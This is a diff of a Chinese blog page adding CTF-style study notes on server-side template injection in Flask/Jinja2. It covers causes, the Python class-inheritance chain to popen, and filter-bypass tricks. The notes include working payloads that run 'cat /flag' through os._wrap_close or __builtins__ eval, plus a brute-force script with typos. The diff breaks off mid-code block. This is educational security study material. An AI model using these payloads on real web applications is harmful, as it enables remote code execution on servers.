@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="什么是SSTI？ \u200b SSTI是一种发生在服务器端模板中的漏洞。当用户的输入返回时会经过一个模板渲染，SSTI漏洞就是恶意用户插入了可以破坏模板">
 <title>SSTI</title>
 
 <link rel='canonical' href='http://localhost:1313/p/ssti/'>
 
 <link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="SSTI">
-<meta property='og:description' content="">
+<meta property='og:description' content="什么是SSTI？ \u200b SSTI是一种发生在服务器端模板中的漏洞。当用户的输入返回时会经过一个模板渲染，SSTI漏洞就是恶意用户插入了可以破坏模板">
 <meta property='og:url' content='http://localhost:1313/p/ssti/'>
 <meta property='og:site_name' content='liernian'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-02-27T22:16:38&#43;08:00'/><meta property='article:modified_time' content='2025-02-27T22:16:38&#43;08:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-03-26T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-03-26T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="SSTI">
-<meta name="twitter:description" content="">
+<meta name="twitter:description" content="什么是SSTI？ \u200b SSTI是一种发生在服务器端模板中的漏洞。当用户的输入返回时会经过一个模板渲染，SSTI漏洞就是恶意用户插入了可以破坏模板">
     <link rel="shortcut icon" href="/favicon.ico" />
 
   
@@ -138,7 +138,7 @@
 
 
                 
-                <span>主页</span>
+                <span>Home</span>
             </a>
         </li>
         
@@ -273,13 +273,77 @@
     </ol>
 </aside>
 
-    
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#什么是ssti">什么是SSTI？</a></li>
+    <li><a href="#ssti的形成原因">SSTI的形成原因</a></li>
+    <li><a href="#ssti的具体实现方法">SSTI的具体实现方法</a></li>
+    <li><a href="#ssti的绕过姿势">SSTI的绕过姿势</a>
+      <ol>
+        <li><a href="#绕过数字">绕过数字</a></li>
+      </ol>
+    </li>
+    <li><a href="#heading"></a>
+      <ol>
+        <li><a href="#用request绕过">用request绕过</a>
+          <ol>
+            <li><a href="#chr拼接解决request被ban">chr()拼接解决request被ban</a></li>
+          </ol>
+        </li>
+        <li><a href="#-绕过">. 绕过</a></li>
+        <li><a href="#绕过">{{绕过</a></li>
+      </ol>
+    </li>
+    <li><a href="#好用的pyload">好用的pyload！！</a></li>
+    <li><a href="#ssti终极工具fenjing">SSTI终极工具——fenjing</a></li>
+    <li><a href="#小结">小结</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
 
             <main class="main full-width">
     <article class="main-article">
     <header class="article-header">
 
     <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/" >
+                知识点总结
+            </a>
+        
+            <a href="/categories/web/" >
+                Web
+            </a>
+        
+    </header>
     
 
     <div class="article-title-wrapper">
@@ -306,7 +370,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">2025-02-27</time>
+                <time class="article-time--published">2025-03-26</time>
             </div>
         
 
@@ -321,7 +385,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 0 分钟
+                    阅读时长: 7 分钟
                 </time>
             </div>
         
@@ -336,7 +400,844 @@
     <section class="article-content">
     
     
-    
+    <h2 id="什么是ssti">什么是SSTI？
+</h2><p>​    SSTI是一种发生在服务器端模板中的漏洞。当用户的输入返回时会经过一个模板渲染，SSTI漏洞就是恶意用户插入了可以破坏模板的语句，导致了敏感信息泄露、rce等问题。</p>
+<p>​    服务器的模板又很多种，不同的语言会有不同的模板框架。</p>
+<p>​    所以SSTI并不只有一种方式，我们平常多遇到的是python的模板</p>
+<hr>
+<h2 id="ssti的形成原因">SSTI的形成原因
+</h2><p>​    其实成因很简单，就是写后端代码的程序员偷懒，用render_template_string解析字符串代替了render_template渲染。而render_template_string渲染时会把内容当作python代码执行，比如4*4会被执行成16</p>
+<p>​    做题的时候可以通过wapplayzer插件，查看框架和语言，一般是Flask和Python的话就是ssti没跑了</p>
+<p><img src="/p/ssti/f70d1d69e8ca4335bce85a386ae8f806.png"
+	width="1924"
+	height="927"
+	srcset="/p/ssti/f70d1d69e8ca4335bce85a386ae8f806_hu1862177443226529625.png 480w, /p/ssti/f70d1d69e8ca4335bce85a386ae8f806_hu17469258236751975995.png 1024w"
+	loading="lazy"
+	
+		alt="Photo by Florian Klauer on Unsplash"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="207"
+		data-flex-basis="498px"
+	
+></p>
+<hr>
+<h2 id="ssti的具体实现方法">SSTI的具体实现方法
+</h2><p>​    这里以python的模板为例</p>
+<p>​    在这些框架中存在很多类，包括可以做到RCE的类。</p>
+<p>​    所以我们的目标就是要通过模板操作到可以进行RCE的类</p>
+<p>​    那么我们输入什么才会被当成模板注入呢？</p>
+<p>​    因为模板渲染的时候会把&quot;{{}}&ldquo;包裹的内容当做变量解析替换。比如，{{2*2}}会被解析成4所以，我们需要用 {{恶意代码}} 的形式来进行SSTI</p>
+<p>​    （所以{{2*2}}也被用作检测SSTI漏洞的方法）</p>
+<p>​    接下来就是SSTI的具体实现方法了</p>
+<p>​     这里借用一下我之前写过的博客<a class="link" href="https://blog.csdn.net/Takagiapa/article/details/144532904?fromshare=blogdetail&amp;sharetype=blogdetail&amp;sharerId=144532904&amp;sharerefer=PC&amp;sharesource=Takagiapa&amp;sharefrom=from_link"  target="_blank" rel="noopener"
+    >BaseCTF_web_week3-CSDN博客</a></p>
+<p>​    这里是一些魔术方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="no">__class__</span>   <span class="nx">：返回类型所属的对象。</span>
+</span></span><span class="line"><span class="cl"><span class="nx">__base__</span>   <span class="nx">：返回该对象所继承的父类</span>
+</span></span><span class="line"><span class="cl"><span class="nx">__mro__</span>     <span class="nx">：返回该对象的所有父类</span>
+</span></span><span class="line"><span class="cl"><span class="nx">__subclasses__</span><span class="p">()</span>  <span class="nx">获取当前类的所有子类</span>
+</span></span><span class="line"><span class="cl"><span class="nx">__init__</span>  <span class="nx">类的初始化方法</span>
+</span></span><span class="line"><span class="cl"><span class="nx">__globals__</span>  <span class="nx">对包含</span><span class="p">(</span><span class="nx">保存</span><span class="p">)</span><span class="nx">函数全局变量的字典的引用</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p>​    假设我们知道一个当前类，通过**__class__返回对象**，然后用**__mro__或者__base__返回父类**，直到父类为object类（所有的类都是object类的子类），再用**__sublasses__返回所有的子类**，这样就能找到存在rce的类啦！</p>
+<p>​    以下是一些当前类的表示方式</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="no">__class__</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">()</span><span class="o">.</span><span class="no">__class__</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[]</span><span class="o">.</span><span class="no">__class__</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="no">__class__</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{}</span><span class="o">.</span><span class="no">__class__</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p>​    （ctfshow_web361）</p>
+<p><img src="/p/ssti/92007fdbd2f749e0be746a79bda75a61.png"
+	width="1163"
+	height="209"
+	srcset="/p/ssti/92007fdbd2f749e0be746a79bda75a61_hu3382259633391543743.png 480w, /p/ssti/92007fdbd2f749e0be746a79bda75a61_hu14194228414806527629.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="556"
+		data-flex-basis="1335px"
+	
+><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p>​    所以我们可以构造{{&rsquo;&rsquo;.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>}}查看所有类</p>
+<p><img src="/p/ssti/fac25d59d26942b193bf62d6ba2941bd.png"
+	width="2522"
+	height="1154"
+	srcset="/p/ssti/fac25d59d26942b193bf62d6ba2941bd_hu2650696921246714651.png 480w, /p/ssti/fac25d59d26942b193bf62d6ba2941bd_hu10231543443246268853.png 1024w"
+	loading="lazy"
+	
+		alt="Photo by Florian Klauer on Unsplash"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="218"
+		data-flex-basis="524px"
+	
+><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p>​    可以进行rce的类是——&ldquo;os._wrap_close&rdquo;，所以我们需要找到这个类的序号</p>
+<p>​    可以复制粘贴去记事本，搜索os._wrap_close一下具体的位置（一般在130多）我这里是132</p>
+<p>​    也可以用这个脚本，记得改一下pyload和url</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span><span class="nb">input</span><span class="p">(</span><span class="s1">&#39;请输入URL链接：)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span><span class="p">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;{{O)._class_._base_.__subclasses_()[&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;]._init_._globals_[&#39;__builtins_1}}&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">posf</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#print(response.text)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span><span class="k">if</span> <span class="s1">&#39;popen&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="k">pass</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p><img src="/p/ssti/d263229c541648dbbc917c8def1da9b9.png"
+	width="1412"
+	height="232"
+	srcset="/p/ssti/d263229c541648dbbc917c8def1da9b9_hu7126112964762685097.png 480w, /p/ssti/d263229c541648dbbc917c8def1da9b9_hu9702985980926991150.png 1024w"
+	loading="lazy"
+	
+		alt="Photo by Florian Klauer on Unsplash"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="608"
+		data-flex-basis="1460px"
+	
+><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p>​     之后用__init__初始化这个类，用__globals__寻找popen函数后可以直接命令执行，记得最后要加一个read()</p>
+<p>​    构造</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">name</span><span class="o">=</span><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="no">__class__</span><span class="o">.</span><span class="nx">__base__</span><span class="o">.</span><span class="nx">__subclasses__</span><span class="p">()[</span><span class="mi">132</span><span class="p">]</span><span class="o">.</span><span class="nx">__init__</span><span class="o">.</span><span class="nx">__globals__</span><span class="p">[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;cat%20/flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>​    这个格式稍微要记一下，目前只知道可以用os._wrap_close的popen</p>
+<p>​    popen后的括号里直接写命令，不需要system</p>
+<p><img src="/p/ssti/1eed318f56bb4fbfbf049113ce10a571.png"
+	width="2013"
+	height="271"
+	srcset="/p/ssti/1eed318f56bb4fbfbf049113ce10a571_hu10903223804741316291.png 480w, /p/ssti/1eed318f56bb4fbfbf049113ce10a571_hu6110996320063266968.png 1024w"
+	loading="lazy"
+	
+		alt="Photo by Florian Klauer on Unsplash"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="742"
+		data-flex-basis="1782px"
+	
+><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p>​    这样我们就成功通过SSTI漏洞进行RCE了</p>
+<hr>
+<h2 id="ssti的绕过姿势">SSTI的绕过姿势
+</h2><p>​    上面上述的是最最基本的一种实现方法，现在是一些绕过手法</p>
+<h3 id="绕过数字">绕过数字
+</h3><p>​        上述pyload用到了132，ban了数字之后我们有两种解决方案</p>
+<p>​        1.是采用另一种pylaod</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">a</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="s1">&#39;__import__(&#34;os&#34;).popen(&#34;cat /flag&#34;).read()&#39;</span><span class="p">)}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">采用了builtins模块</span><span class="err">，</span><span class="n">比用os_wrap_close更加方便</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p><img src="/p/ssti/56e2b6a350474e8ca6abcc9836f96b38.png"
+	width="1132"
+	height="789"
+	srcset="/p/ssti/56e2b6a350474e8ca6abcc9836f96b38_hu3629170371288296921.png 480w, /p/ssti/56e2b6a350474e8ca6abcc9836f96b38_hu6667812828626273574.png 1024w"
+	loading="lazy"
+	
+		alt="Photo by Florian Klauer on Unsplash"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="143"
+		data-flex-basis="344px"
+	
+><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p>​        2.采用全角数字</p>
+<p>​            ０１２３４５６７８９（不知道原理）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">?</span><span class="n">name</span><span class="o">=</span><span class="p">{{</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">０</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">１３２</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p><img src="/p/ssti/938c6dd34658456cb25df306df51ab56.png"
+	width="1317"
+	height="797"
+	srcset="/p/ssti/938c6dd34658456cb25df306df51ab56_hu3682708679796771376.png 480w, /p/ssti/938c6dd34658456cb25df306df51ab56_hu10051552052891877203.png 1024w"
+	loading="lazy"
+	
+		alt="Photo by Florian Klauer on Unsplash"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="165"
+		data-flex-basis="396px"
+	
+><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<h2 id="heading">
+</h2><hr>
+<h3 id="用request绕过">用request绕过
+</h3><p>​        request可以获得请求的相关信息，通过这个特性可以做到绕过（其实用&rsquo;&lsquo;也可以做到绕过）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">例如</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="p">}}</span> <span class="o">==&gt;</span> <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">t1</span><span class="p">]}}</span><span class="o">&amp;</span><span class="n">t1</span><span class="o">=</span><span class="vm">__class__</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="vm">__class__</span> <span class="o">==&gt;</span> <span class="n">_</span><span class="s1">&#39;&#39;</span><span class="n">_cla</span><span class="s1">&#39;&#39;</span><span class="n">ss_</span><span class="s1">&#39;&#39;</span><span class="n">_</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p>​        过滤  <strong>&rsquo; &lsquo;</strong></p>
+<p>​        拿之前讲过的__builtins__举例</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">a</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="s1">&#39;__import__(&#34;os&#34;).popen(&#34;cat /flag&#34;).read()&#39;</span><span class="p">)}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p>​        如果ban了&rsquo;&rsquo;，就说明__builtins__和__import__的使用会被限制，这里就可以用request.args.x（x为get的参数）来避免&rsquo;&lsquo;被检测到</p>
+<p>​        pyload如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">a</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">x</span><span class="p">]</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">y</span><span class="p">)}}</span><span class="o">&amp;</span><span class="n">x</span><span class="o">=</span><span class="n">__builtins__</span><span class="o">&amp;</span><span class="n">y</span><span class="o">=</span><span class="nb">__import__</span><span class="p">(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&#34;cat /flag&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p>​        <img src="/p/ssti/f1d7e8137c604ab9a6a755b85f84d34e.png"
+	width="1519"
+	height="547"
+	srcset="/p/ssti/f1d7e8137c604ab9a6a755b85f84d34e_hu12772217341711194154.png 480w, /p/ssti/f1d7e8137c604ab9a6a755b85f84d34e_hu6277016757180734109.png 1024w"
+	loading="lazy"
+	
+		alt="Photo by Florian Klauer on Unsplash"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="277"
+		data-flex-basis="666px"
+	
+><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p>​    同理，也可以用于绕过其他字符</p>
+<p>​    值得一提的是，如果args被ban了，request.args.x可以替换成request[&lsquo;values&rsquo;][&lsquo;x&rsquo;]的形式<img src="/p/ssti/d8b72e81031b4d93b277d45a7eb3d05a.png"
+	width="1461"
+	height="443"
+	srcset="/p/ssti/d8b72e81031b4d93b277d45a7eb3d05a_hu16472210842129520603.png 480w, /p/ssti/d8b72e81031b4d93b277d45a7eb3d05a_hu8308833693846290143.png 1024w"
+	loading="lazy"
+	
+		alt="Photo by Florian Klauer on Unsplash"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="329"
+		data-flex-basis="791px"
+	
+><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p>​    如果这时 <strong>&rsquo; &lsquo;</strong> 也被ban了，可以用request.cookies.x代替，不过上传参数要传在cookie中
+​     （注意cookies这里需要加 ; ）</p>
+<p><img src="/p/ssti/21c687797459408ba0c3a37ca28a53f1.png"
+	width="1463"
+	height="540"
+	srcset="/p/ssti/21c687797459408ba0c3a37ca28a53f1_hu11188391976090626461.png 480w, /p/ssti/21c687797459408ba0c3a37ca28a53f1_hu10537701569406182141.png 1024w"
+	loading="lazy"
+	
+		alt="Photo by Florian Klauer on Unsplash"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="270"
+		data-flex-basis="650px"
+	
+><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<h4 id="chr拼接解决request被ban">chr()拼接解决request被ban
+</h4><p>​    可以用chr()拼接，可是我们不能直接使用chr()，要用之前的方法通过继承链走到chr()</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">一些chr</span><span class="p">()</span><span class="n">的构造方式</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="n">x</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">chr</span>
+</span></span><span class="line"><span class="cl"><span class="n">get_flashed_messages</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">chr</span>
+</span></span><span class="line"><span class="cl"><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">chr</span>
+</span></span><span class="line"><span class="cl"><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">chr</span>
